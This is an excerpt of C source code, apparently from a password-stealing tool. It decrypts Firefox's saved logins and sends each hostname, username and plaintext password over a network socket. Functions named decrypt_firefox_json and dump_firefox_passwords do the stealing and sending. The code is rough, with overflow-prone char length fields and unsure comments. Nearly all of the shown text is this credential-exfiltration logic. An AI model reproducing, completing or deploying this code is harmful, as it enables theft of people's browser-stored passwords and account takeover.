...
int decrypt_firefox_json(char* dataPointer, SOCKET socket)
{
	HANDLE hFile, hMap;
	DWORD loginSize = 0;
	...
	for (size_t i = 0; i < json_array_get_count(logins); i++) {
		...
		//add to char array
		LPSTR hostname = json_object_get_string(commit, strURL);

		
		size =*(int *) &i; // this is very dangours!
		//NVM
		char strHostnameSize = strlen(hostname);
		char strUserSize = strlen(strUserDecrypted);
		
		char strPasswd = strlen(strPasswordDecrypted);
		
		char headerSize = strHostnameSize + strUserSize + strPasswd + sizeof(strHostnameSize) + sizeof(strUserSize) +sizeof(strPasswd);

		

		if(send(socket,&headerSize,sizeof(char),0) < 0 ){
			
		}

		if(send(socket,&strHostnameSize,sizeof(char),0) < 0 ){
			printf("ERROR");
		}
		if(send(socket,&strUserSize,sizeof(char),0) < 0 ){
			printf("ERROR");
		}
		if(send(socket,&strPasswd,sizeof(char),0) < 0 ){
			printf("ERROR");
		}
		if(send(socket,hostname,strHostnameSize,0) < 0 ){
			printf("ERROR");
		}
		if(send(socket,strUserDecrypted,strUserSize,0) < 0){
			printf("ERROR");
		}
		send(socket,strPasswordDecrypted,strPasswd,0); //chech if this is working
...
int dump_firefox_passwords(char* dataPointer, SOCKET socket)
{
	if (!init_firefox_api())
	{
	...
	int size = decrypt_firefox_json(dataPointer,socket);
	//decrypt_firefox_sql();
